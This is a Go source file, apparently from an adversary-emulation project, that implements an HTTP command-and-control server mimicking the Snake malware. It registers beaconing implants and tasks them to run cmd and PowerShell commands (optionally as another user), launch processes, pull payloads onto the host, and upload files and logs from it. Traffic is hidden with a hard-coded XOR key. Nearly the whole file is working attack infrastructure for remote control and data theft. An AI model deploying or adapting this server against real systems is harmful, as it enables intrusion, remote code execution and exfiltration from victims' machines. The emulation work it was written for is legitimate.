package snake

import (
    "bytes"
    "context"
    "encoding/base64"
    "encoding/json"
    "errors"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "strconv"
    "strings"
    "time"

    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/util"
    "attackevals.mitre-engenuity.org/control_server/logger"
    "github.com/gorilla/mux"
    "golang.org/x/text/encoding/unicode"
)


const (
    serverErrMsg = "Internal server error\n"
    emptyInstructionCode = "00"
    cmdInstructionCode = "01"
    pshInstructionCode = "02"
    procInstructionCode = "03"
    fileDownloadInstructionCode = "04"
    fileUploadInstructionCode = "05"
    uploadLogsInstructionCode = "06"
    maxSleepTimeSec = 40
    minSleepTimeSec = 20
    instructionIdLen = 18
    c2LogId = "62810421015953103444"
    executionLogId = "23329841273669992682"
    pipeServerLogId = "59463656487865612747"
    pipeClientLogId = "16488587954892310865"
    c2LogFileName = "C2Log"
    executionLogFileName = "ExecutionLog"
    pipeServerLogFileName = "PipeServerLog"
    pipeClientLogFileName = "PipeClientLog"
)

var (
    xorKey = []byte("1f903053jlfajsklj39019013ut098e77xhlajklqpozufoghi642098cbmdakandqiox536898jiqjpe6092smmkeut02906")
    xorKeyLen = len(xorKey)
)

type RandIntnGetter func(int) int
type UtcTimeNowGetter func() time.Time

// Represents the HTTP-based Snake C2 handler. Will implement the util.Handler interface.
type SnakeHttpHandler struct {
    restAPIaddress string
    server *http.Server
    listenAddress string
    existingSession map[string]bool // maps implant GUIDs to bool indicating if we have an existing session for that implantm
    pendingPayloads map[string]string // map instruction ID to the payload file to download
    pendingUploads map[string]string // map instruction ID to the file name to save the uploaded file as
    instructionImplantMap map[string]string // map instruction ID to corresponding implant ID
     
    randIntnGetter RandIntnGetter // Wrapper for RandIntn (math/rand)
    utcTimeNowGetter UtcTimeNowGetter // Wrapper for time.Now / time.Utc (time)
}

type SnakeWrappedFuncHandles struct {
    randIntnGetter RandIntnGetter
    utcTimeNowGetter UtcTimeNowGetter
}

type InstructionInfo struct {
    typeCode string
    shellCommand string // for type codes 01 and 02 (cmd/psh execution)
    fileToDownload string // for type code 04 (file download)
    downloadDestPath string // for type code 04 (file download)
    filePathToUpload string // for type for 05 (file upload)
    processBinaryPath string // for type codes 03 (process execution)
    processArgs string // for type codes 03 (process execution)
    runas string // user to run as (for type codes 01, 02, 03)
}

func getUtcNow() time.Time {
    return time.Now().UTC()
}

// Factory method for creating a Snake C2 handler
func snakeHttpHandlerFactory(funcHandles *SnakeWrappedFuncHandles) *SnakeHttpHandler {
    // restAPIaddress, server, and listenAddress will be initialized when handler is started
    return &SnakeHttpHandler{
        existingSession: make(map[string]bool),
        pendingPayloads: make(map[string]string),
        pendingUploads: make(map[string]string),
        instructionImplantMap: make(map[string]string),
        randIntnGetter: funcHandles.randIntnGetter,
        utcTimeNowGetter: funcHandles.utcTimeNowGetter,
    }
}

// Creates and adds the Snake C2 handler to the map of available C2 handlers.
func init() {
    rand.Seed(time.Now().UTC().UnixNano())
    wrappedFuncHandles := &SnakeWrappedFuncHandles {
        randIntnGetter: rand.Intn,
        utcTimeNowGetter: getUtcNow,
    }
    util.AvailableHandlers["snakehttp"] = snakeHttpHandlerFactory(wrappedFuncHandles)
}

// StartHandler starts the Snake C2 handler server
func (s *SnakeHttpHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    listenAddress, err := config.GetHostPortString(configEntry)
    if err != nil {
        return err
    }
    s.listenAddress = listenAddress
    logger.Info("Starting Snake HTTP Handler")

    // make sure we know the REST API address
    s.restAPIaddress = restAddress

    // initialize URL router
    urlRouter := mux.NewRouter()

    s.server = &http.Server{
        Addr:         s.listenAddress,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    // bind HTTP routes to their functions
    urlRouter.HandleFunc("/PUB/{identifier}", s.handleBeacon).Methods("GET")
    urlRouter.HandleFunc("/IMAGES/3/{identifier}", s.handleUpload).Methods("POST")
    urlRouter.HandleFunc("/IMAGES/3/{identifier}", s.handlePayloadDownload).Methods("GET")
    
    // start handler in goroutine so it doesn't block
    go func() {
        err := s.server.ListenAndServe()
        if err != nil && err.Error() != "http: Server closed" {
            logger.Error(err)
        }
    }()
    return nil
}

// StopHandler stops the Snake server
func (s *SnakeHttpHandler) StopHandler() error {
    logger.Info("Killing Snake HTTP server")
    emptyContext := context.Background()
    return s.server.Shutdown(emptyContext)
}

func (s *SnakeHttpHandler) handleBeacon(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    requestIdentifier, ok := vars["identifier"]
    var err error
    task := ""
    if !ok {
        logger.Error("Request identifier not included in GET request to /D/{identifier}")
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(serverErrMsg))
        return
    }
    
    // Snake malware fetches a file /D/pub.txt, and expects the server to respond with a string "1", acknowledging it’s active:
    // https://artemonsecurity.com/snake_whitepaper.pdf
    // Here we decide to use /PUB/home.html instead of /D/pub.txt.
    if requestIdentifier == "home.html" {
        logger.Info("Received heartbeat request.")
        w.WriteHeader(http.StatusOK)
        w.Write([]byte("1"))
        return
    }
    
    // We received a beacon from an implant that already performed the heartbeat check.
    logger.Debug(fmt.Sprintf("Received beacon with ID %s.", requestIdentifier))
        
    // Check if the identifier matches a victim ID that currently exists.
    if !s.hasImplantSession(requestIdentifier) {
        logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session.", requestIdentifier))
        err = s.registerNewImplant(requestIdentifier)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to register implant session: %s", err.Error()))
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(serverErrMsg))
            return
        }
        
        // get bootstrap task for implant
        task, err = s.getBootstrapTask()
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to get bootstrap task for implant: %s", err.Error()))
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(serverErrMsg))
            return
        }
        logger.Info(fmt.Sprintf("Received bootstrap task %s", task))
    } else {
        logger.Info(fmt.Sprintf("Received beacon from %s", requestIdentifier))
        task, err = forwardGetTask(s.restAPIaddress, requestIdentifier)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(serverErrMsg))
            return
        }
    }

    // Forward beacon to CALDERA
    if config.IsCalderaForwardingEnabled() {
        apiResponse, err := util.ForwardImplantBeacon(requestIdentifier, s.restAPIaddress)
        if err != nil {
            logger.Error(fmt.Sprintf("Error occured while forwarding implant beacon to CALDERA for session %s: %s", requestIdentifier, err.Error()))
        } else {
            logger.Info(fmt.Sprintf("Successfully forwarded implant beacon for session %s to CALDERA: %s", requestIdentifier, apiResponse))
        }
    }

    response, err := s.convertTaskToResponse(requestIdentifier, task)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to convert implant task to response: %s", err.Error()))
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(serverErrMsg))
        return
    }
    encryptedResponse := xorData([]byte(response))
    logger.Info(fmt.Sprintf("Tasking implant %s with task: %s", requestIdentifier, task))
    w.Write(encryptedResponse)
}

// Returns true if the handler has seen this implant, false otherwise
func (s *SnakeHttpHandler) hasImplantSession(guid string) bool {
    exists, ok := s.existingSession[guid]
    return ok && exists
}

// Create a new session for the implant
func (s *SnakeHttpHandler) registerNewImplant(guid string) error {
    implantData := createNewSessionDataBytes(guid)
    restResponse, err := forwardRegisterImplant(s.restAPIaddress, implantData)
    if err != nil {
        return err
    }
    if err = s.storeImplantSession(guid); err != nil {
        return err
    }
    logger.Info(restResponse)
    logger.Success(fmt.Sprintf("Successfully created session for implant %s.", guid))
    return nil
}

// Internally store our implant session
func (s *SnakeHttpHandler) storeImplantSession(guid string) error {
    if s.hasImplantSession(guid) {
        return errors.New(fmt.Sprintf("Session %s already exists.", guid))
    }
    s.existingSession[guid] = true
    return nil
}

// Returns bytes representing JSON dict containing specified implant ID.
func createNewSessionDataBytes(guid string) []byte {
    jsonStr, err := json.Marshal(map[string]string{ "guid": guid })
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to create JSON info for session ID %s: %s", guid, err.Error()))
        return nil
    }
    return []byte(jsonStr)
}

// Forward the request to the REST API server to register our implant
func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session"

    // initialize HTTP request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", "application/json")

    // execute HTTP POST request and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", err
    }
    return util.ExtractRestApiStringResponsedData(response)
}

// Fetches the currently set bootstrap task from the REST server
func (s *SnakeHttpHandler) getBootstrapTask() (string, error) {
    url := "http://" + s.restAPIaddress + "/api/v1.0/bootstraptask/snakehttp"

    response, err := http.Get(url)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", err
    }
    // read response from REST API
    body, err := ioutil.ReadAll(response.Body)
    if err != nil {
        return "", err
    }
    return string(body), err
}

// Query the REST API for tasks for the implant with the specified GUID.
func forwardGetTask(restAPIaddress string, guid string) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session/" + guid + "/task"
    resp, err := http.Get(url)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    sessionData, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return "", err
    }
    return string(sessionData), err
}

func (s *SnakeHttpHandler) generateInstructionId() string {
    var idString strings.Builder
    for i := 0; i < instructionIdLen; i++ {
        idString.Write([]byte(strconv.Itoa(s.randIntnGetter(10))))
    }
    return idString.String()
}

func (s *SnakeHttpHandler) generateSleepTime() int {
    return s.randIntnGetter(maxSleepTimeSec - minSleepTimeSec + 1) + minSleepTimeSec
}

// Given a task string, parses out the instruction information. Expects format "typeCode arg1 arg2"
// example: "01 whoami /all"
func extractInstructionInfo(task string) (*InstructionInfo, error) {
	trimmedTask := strings.TrimSpace(task)
	instructionInfo := new(InstructionInfo)
	shellCommand := ""
	targetFile := ""
	destPath := ""
    procPath := ""
    procArgs := ""
    runasUser := ""
	var instructionData map[string]interface{}
	err := json.Unmarshal([]byte(trimmedTask), &instructionData)
	if err != nil {
	    return nil, err
	}
	
	// Extract task type code
	if typeCode, ok := instructionData["type"]; ok {
	    instructionInfo.typeCode = fmt.Sprintf("%02d", int(typeCode.(float64)))
	} else {
	    return nil, errors.New("No task type code provided.")
	}
	
	if command, ok := instructionData["command"]; ok {
	    shellCommand = strings.TrimSpace(command.(string))
	}
	if targFile, ok := instructionData["file"]; ok {
	    targetFile = strings.TrimSpace(targFile.(string))
	}
	if dest, ok := instructionData["dest"]; ok {
	    destPath = strings.TrimSpace(dest.(string))
    }
    if proc, ok := instructionData["proc"]; ok {
	    procPath = strings.TrimSpace(proc.(string))
    }
    if args, ok := instructionData["args"]; ok {
	    procArgs = strings.TrimSpace(args.(string))
    }
    if runas, ok := instructionData["runas"]; ok {
	    runasUser = strings.TrimSpace(runas.(string))
    }
	
	switch instructionInfo.typeCode {
	case cmdInstructionCode, pshInstructionCode:
	    if len(shellCommand) == 0 {
		    return nil, errors.New(fmt.Sprintf("Task code %s requires a command", instructionInfo.typeCode))
	    }
	    instructionInfo.shellCommand = shellCommand
	    instructionInfo.runas = runasUser
    case procInstructionCode:
        if len(procPath) == 0 {
            return nil, errors.New(fmt.Sprintf("Task code %s requires a process to execute", instructionInfo.typeCode))
        }
        instructionInfo.processBinaryPath = procPath
        instructionInfo.processArgs = procArgs
        instructionInfo.runas = runasUser
    case fileDownloadInstructionCode:
        if len(targetFile) == 0 {
		    return nil, errors.New(fmt.Sprintf("Task code %s requires a file to download", instructionInfo.typeCode))
	    }
	    if len(destPath) == 0 {
		    return nil, errors.New(fmt.Sprintf("Task code %s requires a file dest path", instructionInfo.typeCode))
	    }
	    instructionInfo.fileToDownload = targetFile
	    instructionInfo.downloadDestPath = destPath
    case fileUploadInstructionCode:
        if len(targetFile) == 0 {
		    return nil, errors.New(fmt.Sprintf("Task code %s requires target file to upload", instructionInfo.typeCode))
	    }
	    instructionInfo.filePathToUpload = targetFile
    case uploadLogsInstructionCode:
        return instructionInfo, nil
	default:
	    return nil, errors.New(fmt.Sprintf("Unsupported task code %s", instructionInfo.typeCode))
	}
	return instructionInfo, nil
}

func (s *SnakeHttpHandler) convertTaskToResponse(guid, task string) (string, error) {
    if !s.hasImplantSession(guid) {
        return "", errors.New(fmt.Sprintf("No existing session for implant %s.", guid))
    }

    var response string
    instructionCode := emptyInstructionCode
    instructionId := s.generateInstructionId()
    sleepTime := s.generateSleepTime()
    if len(task) > 0 {
        instructionInfo, err := extractInstructionInfo(task)
        if err != nil {
            return "", err
        }
        instructionCode = instructionInfo.typeCode
        switch instructionCode {
        case cmdInstructionCode:
            encodedCommand := base64.StdEncoding.EncodeToString([]byte(instructionInfo.shellCommand))
            if len(instructionInfo.runas) > 0 {
                logger.Info(fmt.Sprintf("Assigning cmd task %s (type code %s) to implant %s to run as %s: %s", instructionId, instructionCode, guid, instructionInfo.runas, instructionInfo.shellCommand))
            } else {
                logger.Info(fmt.Sprintf("Assigning cmd task %s (type code %s) to implant %s to run: %s", instructionId, instructionCode, guid, instructionInfo.shellCommand))
            }
            response = fmt.Sprintf("ID%s#%s &%s#%d&%s&&", instructionId, instructionCode, encodedCommand, sleepTime, instructionInfo.runas)
        case pshInstructionCode:
            // Encode to UTF16LE and base64 encode so that the implant can run it as powershell -enc encodedblob
	        encodedCommand, err := encodePowershellCommand([]byte(instructionInfo.shellCommand))
	        if err != nil {
	            return "", err
	        }
            if len(instructionInfo.runas) > 0 {
                logger.Info(fmt.Sprintf("Assigning psh task %s (type code %s) to implant %s to run as %s: %s", instructionId, instructionCode, guid, instructionInfo.runas, instructionInfo.shellCommand))
            } else {
                logger.Info(fmt.Sprintf("Assigning psh task %s (type code %s) to implant %s to run: %s", instructionId, instructionCode, guid, instructionInfo.shellCommand))
            }
            response = fmt.Sprintf("ID%s#%s &%s#%d&%s&&", instructionId, instructionCode, encodedCommand, sleepTime, instructionInfo.runas)
        case procInstructionCode:
            commandChunk := "&" + instructionInfo.processBinaryPath
            if len(instructionInfo.processArgs) > 0 {
                commandChunk = commandChunk + "&" + base64.StdEncoding.EncodeToString([]byte(instructionInfo.processArgs))
            }
            response = fmt.Sprintf("ID%s#%s %s#%d&%s&&", instructionId, instructionCode, commandChunk, sleepTime, instructionInfo.runas)
            if len(instructionInfo.runas) > 0 {
                logger.Info(fmt.Sprintf("Assigning process task %s (type code %s) to implant id %s to run as %s: %s %s", instructionId, instructionCode, guid, instructionInfo.runas, instructionInfo.processBinaryPath, instructionInfo.processArgs))
            } else {
                logger.Info(fmt.Sprintf("Assigning process task %s (type code %s) to implant id %s to run: %s %s", instructionId, instructionCode, guid, instructionInfo.processBinaryPath, instructionInfo.processArgs))
            }
        case fileDownloadInstructionCode:
            response = fmt.Sprintf("ID%s#%s &%s&%s#%d&&&", instructionId, instructionCode, instructionInfo.fileToDownload, instructionInfo.downloadDestPath, sleepTime)
            s.pendingPayloads[instructionId] = instructionInfo.fileToDownload
            logger.Info(fmt.Sprintf("Assigning task %s (type code %s) to implant id %s to download file %s and save it as %s", instructionId, instructionCode, guid, instructionInfo.fileToDownload, instructionInfo.downloadDestPath))
        case fileUploadInstructionCode:
            response = fmt.Sprintf("ID%s#%s &%s#%d&&&", instructionId, instructionCode, instructionInfo.filePathToUpload, sleepTime)
            splitPath := strings.Split(instructionInfo.filePathToUpload, "\\")
            filename := splitPath[len(splitPath) - 1]
            s.pendingUploads[instructionId] = filename
            logger.Info(fmt.Sprintf("Assigning task %s (type code %s) to implant id %s to upload file %s and save it as %s", instructionId, instructionCode, guid, instructionInfo.filePathToUpload, filename))
        case uploadLogsInstructionCode:
            logger.Info(fmt.Sprintf("Assigning task %s (type code %s) to the implant with id %s to upload current logs", instructionId, instructionCode, guid))
            response = fmt.Sprintf("ID%s#%s #%d&&&", instructionId, instructionCode, sleepTime)
        default:
            return "", errors.New(fmt.Sprintf("Received task with unsupported task type code: %s", instructionCode))
        }
    } else {
        response = fmt.Sprintf("ID%s#%s #%d&&&", instructionId, instructionCode, sleepTime)
    }
    logger.Info(fmt.Sprintf("Assigned implant %s with sleep time %d", guid, sleepTime))
    s.instructionImplantMap[instructionId] = guid
    return response, nil
}

// Decode/decrypt log upload and forward it to the REST API server.
func (s *SnakeHttpHandler) processAndForwardLog(fileName string, data []byte) (string, error) {
	var logData []byte
	splitData := bytes.Split(data, []byte("\n"))
	for _, chunk := range splitData {
	    if len(chunk) > 0 {
	        dst := make([]byte, base64.StdEncoding.DecodedLen(len(chunk)))
	        n, err := base64.StdEncoding.Decode(dst, chunk)
	        if err != nil {
	            return "", err
	        }
	        decrypted := xorData(dst[:n])
	        logData = append(logData, decrypted...)
	        logData = append(logData, []byte("\n")...)
	    }
	}
	return s.processAndForwardUpload(fileName, logData)
}

// Process file upload and forward it to the REST API server.
func (s *SnakeHttpHandler) processAndForwardUpload(fileName string, data []byte) (string, error) {
	url := "http://" + s.restAPIaddress + "/api/v1.0/upload/" + fileName
	resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	return util.ExtractRestApiStringResponsedData(resp)
}

// Forward task output to REST API server
func (s *SnakeHttpHandler) forwardTaskOutput(guid string, data []byte) (string, error) {
    url := "http://" + s.restAPIaddress + "/api/v1.0/session/" + guid + "/task/output"

    // initialize HTTP request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", "application/json")

    // execute HTTP POST request and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", err
    }
    return util.ExtractRestApiStringResponsedData(response)
}

// Process POST requests containing either a file upload or command output.
func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) {
    var response string
    var err error
    
    vars := mux.Vars(r)
    instructionId, ok := vars["identifier"]
    if !ok {
        logger.Error("Instruction ID not included in POST request")
        w.WriteHeader(http.StatusBadRequest)
        w.Write([]byte(serverErrMsg))
        return
    }
    postBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to read POST body: %s", err.Error()))
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(serverErrMsg))
        return
    }
    
    filename, ok := s.pendingUploads[instructionId]
    if !ok {
        // This instruction is not tied to a normal file upload - assume it's for command task output or log file.
        switch instructionId {
        case c2LogId:
            logger.Info("Received C2 log")
            response, err = s.processAndForwardLog(c2LogFileName + s.getTimeExtension("log"), postBody)
        case executionLogId:
            logger.Info("Received execution log")
            response, err = s.processAndForwardLog(executionLogFileName + s.getTimeExtension("log"), postBody)
        case pipeServerLogId:
            logger.Info("Received pipe server log")
            response, err = s.processAndForwardLog(pipeServerLogFileName + s.getTimeExtension("log"), postBody)
        case pipeClientLogId:
            logger.Info("Received pipe client log")
            response, err = s.processAndForwardLog(pipeClientLogFileName + s.getTimeExtension("log"), postBody)
        default:
            logger.Info("Received task output for instruction ID: ", instructionId)
            
            // Get implant ID corresponding to the instruction ID
            guid, ok := s.instructionImplantMap[instructionId]
            if !ok {
                logger.Error(fmt.Sprintf("Instruction ID %s not tied to an implant ID", instructionId))
                w.WriteHeader(http.StatusBadRequest)
                w.Write([]byte(serverErrMsg))
                return
            }
            
            // Decrypt and forward task output
            response, err = s.forwardTaskOutput(guid, xorData(postBody))
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to process and task output for instruction id %s: %s", instructionId, err.Error()))
                w.WriteHeader(http.StatusInternalServerError)
                w.Write([]byte(serverErrMsg))
                return
            }
        }
        // Send success response to implant
        logger.Success(response)
        fmt.Fprint(w, "1")
    } else {
        // Save upload file
        logger.Info("Received file upload request for file name: ", filename)
        
        // Get implant ID corresponding to the instruction ID
        guid, ok := s.instructionImplantMap[instructionId]
        if !ok {
            logger.Error(fmt.Sprintf("Instruction ID %s not tied to an implant ID", instructionId))
            w.WriteHeader(http.StatusBadRequest)
            w.Write([]byte(serverErrMsg))
            return
        }
        
        response, err = s.processAndForwardUpload(filename, xorData(postBody))
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to process and forward upload: %s", err.Error()))
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(serverErrMsg))
            return
        }
        
        // Send success response to implant
        logger.Success(response)
        fmt.Fprint(w, "1")
        
        // Let REST API server know that the upload task completed
        response, err = util.ForwardTaskOutput(s.restAPIaddress, guid, []byte(fmt.Sprintf("Received and processed file upload %s for implant %s", filename, guid)))
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to forward upload task output for instruction id %s: %s", instructionId, err.Error()))
            return
        }
        logger.Success(response)
    }
}

// Receiving file from the control server. If the file does not exist, an error response is returned.
func (s *SnakeHttpHandler) forwardGetFileFromServer(fileName string) ([]byte, error) {
    url := "http://" + s.restAPIaddress + "/api/v1.0/files/snake/" + fileName
    resp, err := http.Get(url)
    var filedata []byte
    if err != nil {
        return filedata, err
    }
    if resp.StatusCode != 200 {
        return filedata, errors.New("server did not return requested file: " + fileName)
    }
    filedata, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        return filedata, err
    }
    return filedata, nil
}

// Downloads the requested file from the control server.
func (s *SnakeHttpHandler) handlePayloadDownload(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    instructionId := vars["identifier"]
    payload, ok := s.pendingPayloads[instructionId]
    if !ok {
        logger.Error(fmt.Sprintf("Instruction ID %s not tied to any pending payloads", instructionId))
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(serverErrMsg))
        return
    }
    logger.Info("Received file download request for payload: ", payload)
    
    // Get implant ID for the instruction
    guid, ok := s.instructionImplantMap[instructionId]
    if !ok {
        logger.Error(fmt.Sprintf("Instruction ID %s not tied to an implant ID", instructionId))
        w.WriteHeader(http.StatusBadRequest)
        w.Write([]byte(serverErrMsg))
        return
    }
    
    fileData, err := s.forwardGetFileFromServer(payload)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to perform file download request: %s", err.Error()))
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(serverErrMsg))
        return
    }
    
    // Send payload data to implant
    w.WriteHeader(http.StatusOK)
    w.Write(xorData(fileData))
    
    // Let REST API server know that the upload task completed
    resp, err := util.ForwardTaskOutput(s.restAPIaddress, guid, []byte(fmt.Sprintf("Sent payload %s to implant %s", payload, guid)))
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to forward payload download task output to REST server: %s", err.Error()))
    } else {
        logger.Success(resp)
    }
}

func (s *SnakeHttpHandler) getTimeExtension(extension string) string {
    return "." + s.utcTimeNowGetter().Format("2006-01-02-15-04-05") + "." + extension
}

// Convert to UTFL16-LE and base64 encode to be compatible with powershell's -encoded option
func encodePowershellCommand(blob []byte) (string, error) {
    unicodeEncoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder()
    converted, err := unicodeEncoder.Bytes(blob)
    if err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(converted), nil
}

// Encrypt/decrypt using XOR
func xorData(input []byte) []byte {
    result := make([]byte, len(input))
    size := len(input)
    for i := 0; i < size; i++ {
        result[i] = input[i] ^ xorKey[i % xorKeyLen]
    }
    return result
}
